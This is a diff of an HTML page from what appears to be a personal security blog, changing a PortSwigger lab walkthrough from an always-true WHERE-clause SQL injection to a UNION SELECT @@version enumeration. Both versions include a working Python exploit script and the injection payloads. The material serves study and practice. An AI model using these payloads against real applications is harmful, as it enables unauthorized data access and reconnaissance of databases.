@@ -5,73 +5,64 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-
+  
     <!-- Canonical & SEO -->
-    <title>SQL Injection in WHERE Clause | PortSwigger Lab</title>
-    <meta name="description"
-        content="Exploiting an SQL injection vulnerability in the WHERE clause to retrieve hidden data from the database." />
-    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli/sql1.html" />
-
+    <title>SQL Injection – MySQL & MSSQL Version Enumeration | Shubham Ranpise</title>
+    <meta name="description" content="Use SQL injection to detect backend database type and version on MySQL and Microsoft SQL Server." />
+    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli/sqli4.html" />
+  
     <!-- Open Graph -->
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="SQL Injection in WHERE Clause | Shubham Ranpise" />
-    <meta property="og:description"
-        content="Step-by-step walkthrough of exploiting an SQL injection vulnerability to access hidden or unauthorized data." />
-    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sql1.html" />
+    <meta property="og:title" content="SQLi Database Enumeration | Shubham Ranpise" />
+    <meta property="og:description" content="Learn to query and detect database type and version on MySQL and Microsoft SQL Server targets using SQL injection techniques." />
+    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sqli4.html" />
     <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
-
+  
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="SQL Injection in WHERE Clause" />
-    <meta name="twitter:description"
-        content="Learn how a SQL injection in the WHERE clause can be abused to extract hidden database content." />
+    <meta name="twitter:title" content="SQL Injection - MySQL & MSSQL Enumeration | Shubham Ranpise" />
+    <meta name="twitter:description" content="How to enumerate backend database systems (MySQL, Microsoft SQL Server) using SQL injection. Part of the PortSwigger CTF series." />
     <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
-
+  
     <!-- Favicon -->
     <link rel="icon" href="https://shubhamranpise.com/assets/favicon.png" type="image/png" />
-
+  
     <!-- Preloads -->
     <link rel="preload" href="./../../../assets/home_light.png" as="image" />
     <link rel="preload" href="./../../../assets/theme_light.png" as="image" />
     <link rel="preload" href="./../../../assets/profile-pic.png" as="image" />
-
+  
     <!-- Theme & Fonts -->
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
     <link rel="stylesheet" href="./../../../static/css/style.css" />
     <link rel="stylesheet" href="./../../../static/css/mediaqueries.css" />
-
+  
     <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-45Z0Y6HPDS"></script>
     <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-        gtag('config', 'G-45Z0Y6HPDS');
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-45Z0Y6HPDS');
     </script>
-
+  
     <!-- JSON-LD Schema -->
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
-      "@type": "LearningResource",
-      "name": "SQL Injection in WHERE Clause",
-      "description": "Step-by-step guide on exploiting a SQL injection in the WHERE clause to extract hidden or unauthorized data in a PortSwigger lab.",
+      "@type": "TechArticle",
+      "name": "SQL Injection on MySQL & MSSQL – Version Detection",
       "author": {
         "@type": "Person",
         "name": "Shubham Ranpise"
       },
-      "datePublished": "2025-04-22",
-      "educationalUse": "practice",
-      "learningResourceType": "walkthrough",
-      "url": "https://shubhamranpise.com/ctf/portswigger/sqli/sql1.html",
-      "image": "https://shubhamranpise.com/assets/og-image.jpg",
-      "publisher": {
-        "@type": "Organization",
-        "name": "shubhamranpise.com"
-      }
+      "datePublished": "2025-04-27",
+      "description": "Using SQL injection techniques to detect and query backend databases like MySQL and Microsoft SQL Server.",
+      "url": "https://shubhamranpise.com/ctf/portswigger/sqli/sqli4.html"
     }
     </script>
-</head>
+</head>  
+
 
 <body>
     <header>
@@ -131,35 +122,29 @@
             <a href="./../../../index.html">Home</a>/
             <a href="./../../ctf.html">Ctf</a>/
             <a href="./../portswigger.html">Portswigger</a>/
-            <span>SQLi 1</span>
+            <span>SQLi 4</span>
         </p>
     </div>
     <br>
 
     <section id="ctf">
-        <h2 class="lab-heading">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+        <h2 class="lab-heading">SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
         <div class="lab-section">
-            <h3 class="lab-date">🕗 22-April-2025</h3>
+            <h3 class="lab-date">🕗 27-April-2025</h3>
             <h3 class="lab-subheading">📚 What I Learned</h3>
-            <p>In this lab, I learned how a basic SQL injection vulnerability in a WHERE clause can be abused to bypass
-                filters and retrieve hidden or restricted content.
-                By injecting an always-true condition like ' OR 1=1--, I was able to trick the SQL engine into returning
-                all rows from the product database, regardless of the original query.
-                This is one of the most fundamental SQLi techniques, and it’s eye-opening how something this simple can
-                completely break application logic if input validation is missing.</p>
+            <p>This lab showed how SQL injection can be used to extract system-level information from a database. By
+                injecting a <i><b>UNION SELECT</b></i> with the <i><b>@@version</b></i> variable, I was able to retrieve the database version from
+                MySQL or Microsoft SQL Server. Knowing the database version is critical because it can help an attacker
+                choose the correct techniques and payloads for further exploitation.</p>
 
             <h3 class="lab-subheading">⚙️ How Exploit Works</h3>
             <p>
                 [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
-                [+] The lab uses a category parameter in the URL to filter products.<br>
-                [+] This parameter is directly used in a SQL WHERE clause.<br>
-                [+] The application does not sanitize the input properly.<br>
-                [+] An SQL injection payload is added to bypass the filter condition.<br>
-                [+] The payload forces the condition to always be true.<br>
-                [+] As a result, the server returns all product entries from the database.<br>
-                [+] The script checks for a known product name in the response to confirm success.<br><br>
-                🔁<i><b>Note:</b> You may need to update the product name "Folding Gadgets" in the script, depending on
-                    what appears in your specific lab.</i>
+                [+] The category parameter is vulnerable to SQL injection.<br>
+                [+] A <i><b>UNION SELECT</b></i> is used to inject the payload and retrieve the database version.<br>
+                [+] The <i><b>@@version</b></i> system variable reveals database type and version.<br>
+                [+] The script checks the response for known output to confirm success.<br>
+                [+] Adjustments may be needed based on the lab’s displayed content (like "ubuntu").
             </p>
 
             <h3 class="lab-subheading">🖥️ Command to Run</h3>
@@ -185,8 +170,8 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
     uri = '/filter?category='
-    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    if "Folding Gadgets" in r.text:
+    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
+    if "ubuntu" in r.text:
         return True
     else:
         return False
@@ -194,16 +179,16 @@ def exploit_sqli(url, payload):
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
-        payload = "'+OR+1=1--"
+        payload = '\' UNION SELECT @@version, NULL-- -'
     except IndexError:
         print("[-] Usage: %s &lt;url&gt;" %sys.argv[0])
-        print('[-] Example: %s www.example.com' % sys.argv[0])
-        sys.exit(-1)
+        print('[-] Example: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)    
         
     if exploit_sqli(url, payload):
         print("[+] SQL injection successful!")
     else:
-        print("[-] SQL injection unsuccessful")
+        print("[-] SQL injection unsuccessful")        
 </code></pre>
                 <div class="floating-code-buttons">
                     <button class="copy-btn">📋</button>
